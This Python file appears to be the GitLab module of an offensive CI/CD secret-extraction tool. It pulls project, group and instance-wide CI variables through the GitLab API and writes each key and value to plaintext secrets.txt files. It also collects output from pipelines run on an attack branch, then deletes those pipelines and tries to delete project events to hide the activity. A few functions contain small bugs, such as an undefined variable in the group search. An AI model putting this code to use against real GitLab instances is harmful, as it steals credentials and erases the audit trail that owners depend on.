import requests
import time
from os import makedirs
from nordstream.utils.log import logger
from nordstream.utils.errors import GitLabError
from nordstream.git import ATTACK_COMMIT_MSG, LOCAL_USERNAME

COMPLETED_STATES = ["success", "failed", "canceled", "skipped"]


class GitLab:
    _DEFAULT_BRANCH_NAME = "dev_remote_ea5Eu"
    _auth = None
    _session = None
    _token = None
    _projects = []
    _groups = []
    _outputDir = "nord-stream-logs"
    _header = None
    _gitlabURL = None
    _verifyCert = True
    _branchName = _DEFAULT_BRANCH_NAME
    _sleepTime = 15
    _sleepTimeOutput = 6
    _maxRetry = 10

    def __init__(self, url, token):
        self._gitlabURL = url.strip("/")
        self._token = token
        self._header = {"PRIVATE-TOKEN": token}
        self._session = requests.Session()
        self._gitlabLogin = self.__getLogin()
        # self._session.headers.update({"PRIVATE-TOKEN": token})

    @property
    def projects(self):
        return self._projects

    @property
    def groups(self):
        return self._groups

    @property
    def token(self):
        return self._token

    @property
    def url(self):
        return self._gitlabURL

    @property
    def outputDir(self):
        return self._outputDir

    @outputDir.setter
    def outputDir(self, value):
        self._outputDir = value

    @property
    def defaultBranchName(self):
        return self._DEFAULT_BRANCH_NAME

    @property
    def branchName(self):
        return self._branchName

    @branchName.setter
    def branchName(self, value):
        self._branchName = value

    @classmethod
    def checkToken(cls, token, gitlabURL):
        logger.verbose(f"Checking token: {token}")
        # from https://docs.gitlab.com/ee/api/rest/index.html#personalprojectgroup-access-tokens
        return (
            requests.get(
                f"{gitlabURL.strip('/')}/api/v4/projects",
                headers={"PRIVATE-TOKEN": token},
            ).status_code
            == 200
        )

    def __getLogin(self):
        response = self.getUser()
        return response["username"]

    def getUser(self):
        logger.debug(f"Retrieving user informations")
        return self._session.get(
            f"{self._gitlabURL}/api/v4/user",
            headers=self._header,
            verify=self._verifyCert,
        ).json()

    def __paginatedGet(self, url, params={}):

        params["per_page"] = 100

        res = []

        i = 1
        while True:

            params["page"] = i

            response = self._session.get(
                url,
                headers=self._header,
                params=params,
                verify=self._verifyCert,
            )

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break
                res.extend(response.json())
                i += 1

            else:
                logger.error("Error {response.status_code} while retrieving data: {url}")
                return response.status_code, response.json()

        return response.status_code, res

    def listVariablesFromProject(self, project):
        id = project.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/projects/{id}/variables")

        if status_code == 200:

            path = self.__createOutputDir(project.get("path_with_namespace"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromGroup(self, group):
        id = group.get("id")
        res = []

        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/groups/{id}/variables")

        if status_code == 200:

            path = self.__createOutputDir(group.get("full_path"))

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def listVariablesFromInstance(self):
        res = []
        status_code, response = self.__paginatedGet(f"{self._gitlabURL}/api/v4/admin/ci/variables")

        if status_code == 200:

            path = self.__createOutputDir("")

            f = open(f"{path}/secrets.txt", "w")

            for variable in response:
                res.append({"key": variable["key"], "value": variable["value"], "protected": variable["protected"]})

                f.write(f"{variable['key']}={variable['value']}\n")

            f.close()
        elif status_code == 403:
            raise GitLabError(response.get("message"))
        return res

    def addProject(self, project=None, filterWrite=False, strict=False):
        logger.debug(f"Checking project: {project}")

        # username = self.__getLogin()
        # response = self._session.get(f"https://gitlab.com/api/v4/users/{username}/projects", headers=self._header)

        i = 1
        while True:

            params = {"per_page": 100, "page": i}

            if project != None:
                params["search_namespaces"] = True
                params["search"] = project

            if filterWrite:
                params["min_access_level"] = 30

            response = self._session.get(
                f"{self._gitlabURL}/api/v4/projects",
                headers=self._header,
                params=params,
                verify=self._verifyCert,
            )

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break

                for p in response.json():
                    if strict and p.get("path_with_namespace") != project:
                        continue
                    p = {
                        "id": p.get("id"),
                        "path_with_namespace": p.get("path_with_namespace"),
                        "name": p.get("name"),
                    }
                    self._projects.append(p)
                i += 1
            else:
                logger.error("Error while retrieving projects")
                logger.debug(response.json())

    def addGroups(self, group=None):
        logger.debug(f"Checking group: {group}")

        i = 1
        while True:

            params = {"per_page": 100, "page": i, "all_available": True}

            if group != None:
                params["search_namespaces"] = True
                params["search"] = project

            response = self._session.get(
                f"{self._gitlabURL}/api/v4/groups",
                headers=self._header,
                params=params,
                verify=self._verifyCert,
            )

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break

                for p in response.json():
                    p = {
                        "id": p.get("id"),
                        "full_path": p.get("full_path"),
                        "name": p.get("name"),
                    }
                    self._groups.append(p)
                i += 1
            else:
                logger.error("Error while retrieving groups")
                logger.debug(response.json())

    def __createOutputDir(self, name):
        # outputName = name.replace("/", "_")
        path = f"{self._outputDir}/{name}"
        makedirs(path, exist_ok=True)
        return path

    def waitPipeline(self, projectId):
        logger.info("Getting pipeline output")

        time.sleep(5)

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}",
            headers=self._header,
            verify=self._verifyCert,
        ).json()

        if response[0].get("status") not in COMPLETED_STATES:
            for i in range(self._maxRetry):
                logger.warning(f"Pipeline still running, sleeping for {self._sleepTime}s")
                time.sleep(self._sleepTime)

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}",
                    headers=self._header,
                    verify=self._verifyCert,
                ).json()

                if response[0].get("status") in COMPLETED_STATES:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Error: pipeline still not finished.")

        return (
            response[0].get("id"),
            response[0].get("status"),
        )

    def __getJobId(self, projectId, pipelineId):

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}/jobs",
            headers=self._header,
            verify=self._verifyCert,
        ).json()

        return response[0].get("id")

    def downloadPipelineOutput(self, project, pipelineId):
        projectPath = project.get("path_with_namespace")
        self.__createOutputDir(projectPath)

        projectId = project.get("id")

        jobId = self.__getJobId(projectId, pipelineId)

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace",
            headers=self._header,
            verify=self._verifyCert,
        )

        if response.status_code != 200:
            for i in range(self._maxRetry):
                logger.warning(f"Output not ready, sleeping for {self._sleepTimeOutput}s")
                time.sleep(self._sleepTimeOutput)
                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/jobs/{jobId}/trace",
                    headers=self._header,
                    verify=self._verifyCert,
                )
                if response.status_code == 200:
                    break
                if i == (self._maxRetry - 1):
                    logger.error("Output still no ready, error !")
                    return None

        date = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(f"{self._outputDir}/{projectPath}/pipeline_{date}.log", "w") as f:
            f.write(response.text)
        f.close()
        return f"pipeline_{date}.log"

    def __deletePipeline(self, projectId):
        logger.debug("Deleting pipeline")

        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines?ref={self._branchName}&username={self._gitlabLogin}",
            headers=self._header,
            verify=self._verifyCert,
        ).json()

        for pipeline in response:

            # additional checks for non default branches
            # we don't want to remove legitimate logs
            if self._branchName != self._DEFAULT_BRANCH_NAME:
                commitId = pipeline.get("sha")

                response = self._session.get(
                    f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/commits/{commitId}",
                    headers=self._header,
                    verify=self._verifyCert,
                ).json()

                if response.get("title") != ATTACK_COMMIT_MSG:
                    continue

                if response.get("author_name") != LOCAL_USERNAME:
                    continue

            pipelineId = pipeline.get("id")
            response = self._session.delete(
                f"{self._gitlabURL}/api/v4/projects/{projectId}/pipelines/{pipelineId}",
                headers=self._header,
                verify=self._verifyCert,
            )

    def cleanAllLogs(self, projectId):
        # deleting the pipeline removes everything
        self.__deletePipeline(projectId)

    # not working
    def __cleanEvents(self, projectId):
        logger.debug(f"Deleting events for project: {projectId}")

        i = 1
        while True:

            params = {"per_page": 100, "page": i}

            response = self._session.get(
                f"{self._gitlabURL}/api/v4/projects/{projectId}/events",
                headers=self._header,
                params=params,
                verify=self._verifyCert,
            )

            if response.status_code == 200:
                if len(response.json()) == 0:
                    break

                for event in response.json():
                    eventId = event.get("id")
                    # don't work
                    response = self._session.delete(
                        f"{self._gitlabURL}/api/v4/projects/{projectId}/events/{eventId}",
                        headers=self._header,
                        verify=self._verifyCert,
                    )

                i += 1
            else:
                logger.error("Error while retrieving event")
                logger.debug(response.json())

    def getBranchesProtectionRules(self, projectId):
        logger.debug("Getting branch protection rules")
        response = self._session.get(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/protected_branches",
            headers=self._header,
            verify=self._verifyCert,
        )

        if response.status_code == 403:
            raise GitLabError(response.json().get("message"))

        return response.json()

    def getBranches(self, projectId):
        logger.debug("Getting branch protection rules (limited)")

        status_code, response = self.__paginatedGet(
            f"{self._gitlabURL}/api/v4/projects/{projectId}/repository/branches"
        )

        if status_code == 403:
            raise GitLabError(response.json().get("message"))

        return response
